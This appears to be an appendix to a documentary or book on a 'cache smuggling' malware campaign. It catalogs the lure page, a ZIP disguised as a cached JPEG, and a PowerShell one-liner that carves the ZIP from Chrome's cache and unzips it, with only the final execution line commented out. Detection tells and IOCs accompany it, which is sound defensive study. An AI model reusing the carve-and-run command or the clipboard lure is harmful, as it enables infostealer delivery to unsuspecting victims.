# Appendix C — The Files, Documented

> **This is the artifact catalog** — the specific files walked through in John Hammond's
> *"My Browser Cache Got Infected,"* mapped to their primary published analysis and to
> Hammond's own reproduction code. Each entry gives the file's **role, structure, and a
> defanged/annotated reconstruction** so it can be studied and detected without shipping a
> working weapon.
>
> **Primary campaign source:** Expel — *"Cache smuggling: When a picture isn't a thousand
> words"* (analysis by **Marcus Hutchins / MalwareTech**). The one-liner and markers below
> are the **already-public IOCs** from that writeup, reproduced for detection. Execution
> steps are neutralized (`<REDACTED>`), and no attacker-hosted payload is included — the
> chain is inert without it.

---

## C.0 Which campaign the video covers (reconciliation)

Public reporting shows the cache-smuggling technique wearing **two lure costumes**. The
book's Chapter 1 described the **ClickFix / fake-Cloudflare** shape (the widely-seen
`Win+R` version). The file-level artifacts Hammond dissects match Expel's documented
**FileFix / Fortinet** variant. Same engine, different paint:

| | ClickFix variant | **FileFix / Fortinet variant (documented here)** |
|---|---|---|
| Lure theme | "Verify you're human" (Cloudflare/Google) | Fake **FortiClient VPN compliance** page |
| Manual step | `Win+R` (Run dialog) | **File Explorer address bar** (FileFix) |
| Decoy shown | a command / URL | file path `\\Public\Support\VPN\ForticlientCompliance.exe` |
| Hidden real command | `powershell -enc …` | `headless powershell -c "…"` padded with **139 leading spaces** |
| Payload delivery | cached "image" batch/zip | cached **`image/jpeg`** ZIP carved from Chrome cache |

Both are cache smuggling. Appendix C documents the Fortinet/FileFix artifacts because that
is where the primary source gives file-level detail. Where Hammond's video shows the
Cloudflare/batch shape, the mechanics in [Chapter 2](chapter-02-cache-smuggling.md) apply
identically.

---

## C.1 File map (the cast of artifacts)

```
 [1] The lure page            index.html  (fake FortiClient/reCAPTCHA verification)
        │  writes to clipboard + causes the cached "image"
 [2] The smuggled image       <cache blob>  Content-Type: image/jpeg  (really a ZIP)
        │  pasted command carves it out
 [3] The clipboard one-liner  headless powershell -c "…"   (the carve-and-run)
        │  regex-extracts bytes between markers
 [4] The carved archive       ComplianceChecker.zip  ->  FortiClientComplianceChecker.exe
        │  runs
 [5] The final stage          loader / infostealer   (out of scope to reproduce)
```

Hammond's **own reproduction** of file [1] (the lure) is public and benign — see C.6.

---

## C.2 Artifact [1] — the lure page (`index.html`)

**Role:** Social-engineering front end. Renders a convincing verification widget, and on
interaction **writes the attack command to the victim's clipboard** while showing an
innocent decoy.

**Documented behavior (Expel/Fortinet variant):**
- Presents a fake **FortiClient VPN "compliance"** check.
- The visible textbox / "Open File Explorer" button *appears* to reference an existing file
  `\\Public\Support\VPN\ForticlientCompliance.exe`.
- **What actually lands on the clipboard is far longer** — the real payload command,
  **padded with 139 leading spaces** so the victim (pasting into a narrow address bar) sees
  only whitespace and the decoy tail, not the `powershell` at the front.

**Defender tell:** any web page that programmatically calls `navigator.clipboard.writeText`
(or `document.execCommand('copy')`) on click, especially with content far longer than what's
displayed, tied to a "verify/compliance/fix" flow. See Hammond's benign clone (C.6) for the
exact JS pattern (`showVerifyWindow`).

## C.3 Artifact [2] — the smuggled "image" (the cache blob)

**Role:** The payload, pre-staged on disk by the browser as ordinary cache.

**Structure:**
- Served with **`Content-Type: image/jpeg`** so the browser caches it without suspicion.
- The bytes are actually a **ZIP archive** wrapped between two unique **marker strings** so
  a later stage can find and carve it out of the packed Chrome cache DB.
- Lives in `…\Google\Chrome\User Data\Default\Cache\Cache_Data\` (see
  [Appendix A](appendix-a-artifacts.md) for all browser paths).

**Published markers (IOCs for detection — do not treat as safe to run):**

| Marker | Value (as published by Expel) | Purpose |
|--------|-------------------------------|---------|
| Start | `bTgQcBpv` | left boundary of carved bytes |
| End | `mX6o0lBw` | right boundary of carved bytes |

**Defender tell:** a `Cache_Data` entry whose HTTP type is `image/jpeg` but whose body
contains the literal marker strings above, or ZIP magic (`PK\x03\x04`) instead of JPEG
magic (`FF D8 FF`).

## C.4 Artifact [3] — the clipboard one-liner (annotated & neutralized)

This is the command the FileFix step pastes. Below it is **deobfuscated and annotated for
analysis**, with the execution neutralized. It is the exact public IOC from Expel, broken
into steps — **not** a copy-run block.

```powershell
# (prefixed with ~139 spaces + run "headless" via conhost to hide the window)
headless powershell -c "
  $k = '%LOCALAPPDATA%\FortiClient\compliance'          # 1. staging dir (looks legit)
  mkdir -Force $k > $null
  $d = '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\'
  cp $d* $k                                              # 2. copy ALL Chrome cache here
  gci $k | % {
     $c = [Text.Encoding]::Default.GetString(
             [IO.File]::ReadAllBytes($_.FullName))       # 3. read each cached file as text
     $m = [regex]::Matches($c,'(?<=bTgQcBpv)(.*?)(?=mX6o0lBw)',16)  # 4. carve between markers
     if ($m.Count -gt 0) {
        [IO.File]::WriteAllBytes($k+'\ComplianceChecker.zip',
              [Text.Encoding]::Default.GetBytes($m[0].Value))       # 5. reassemble the ZIP
        Expand-Archive $k'\ComplianceChecker.zip' $k -Force         # 6. unzip
        # & $k'\FortiClientComplianceChecker.exe'    <-- 7. REDACTED execution of payload
     }
  }"
```

**Why each step matters to a hunter:**
1–2. A non-browser process **enumerating and copying `Cache_Data`** is the loudest signal.
3–4. `[regex]::Matches` with fixed marker strings over cache bytes = **carving**, not caching.
5–6. Writing a **ZIP built from cache bytes** then `Expand-Archive` = staged, fileless-ish delivery.
7. The final `& …ComplianceChecker.exe` is where a real chain would detonate; **left disabled here.**

> The clever bit: **no download at run time.** Step 2 just copies files the browser already
> cached. Network monitoring at execution time sees nothing fetched.

## C.5 Artifact [4] — the carved archive & runner

- `ComplianceChecker.zip` — reassembled from the carved marker bytes.
- `FortiClientComplianceChecker.exe` — the unzipped runner the one-liner would execute.
- Named to blend with the FortiClient decoy so a glancing user/analyst sees "compliance
  tooling," not malware.

**Detection:** a freshly-written `.zip`/`.exe` under `%LOCALAPPDATA%\FortiClient\compliance`
(a path FortiClient itself does not create) minutes after a browser session and an
`explorer.exe`→`powershell` event. Correlate with [Appendix B](appendix-b-detection.md) R1–R3.

## C.6 Artifact [1], reproduced benignly — Hammond's `recaptcha-phish`

Hammond published a **safe, educational reproduction** of the lure front end (the
September 2024 origin of the ClickFix wave), which is the cleanest way to study Artifact [1]
without touching a live sample.

- **Repo:** `github.com/JohnHammond/recaptcha-phish` (John Hammond, 2024-09-13).
- **Files:**
  - `index.html` — self-contained fake reCAPTCHA (CSS+JS inline). The command that gets
    "copied" lives at the end of the **`showVerifyWindow`** JS function — the exact hook a
    defender should recognize.
  - `recaptcha-verify` — a benign **HTA** proof-of-concept whose "payload" merely pops
    **Windows Calculator** (`calc.exe`) — a standard harmless stand-in.
  - `README.md` — explains the lure, credits Unit42 / Orange Cyberdefense / Huntress, links
    the Emmenhtal loader and **LummaStealer** campaigns.
- **Educational perks Hammond notes:** fake "Verification ID" text in the Run box to hide
  the command, a disabled "Verify" button to nudge the paste, follow-up "failed to verify"
  windows for repeat attempts, and clipboard-clearing after paste.

> Use this repo (calc.exe payload) for the documentary's lab-safe lure shots — never a live
> sample. See [documentary/shot-list.md](documentary/shot-list.md).

## C.7 Consolidated IOC table (defanged)

| # | Artifact | Key indicator | Type |
|---|----------|---------------|------|
| 1 | Lure page | JS clipboard write on "verify/compliance" click; 139-space padding | behavior |
| 2 | Cache blob | `Content-Type: image/jpeg` + ZIP magic `PK` + markers below | disk/net |
| 2 | Markers | start `bTgQcBpv` / end `mX6o0lBw` | string |
| 3 | One-liner | `headless powershell`; copies `Cache_Data`; `[regex]::Matches` carve | cmdline |
| 3 | Staging dir | `%LOCALAPPDATA%\FortiClient\compliance\` | path |
| 4 | Archive | `ComplianceChecker.zip` → `FortiClientComplianceChecker.exe` | file |
| 5 | Final | loader/infostealer (Lumma-family lineage per Hammond) | family |

All values are historical and **defanged**; validate against current intel before use.
Sources for every item: [sources.md](sources.md).
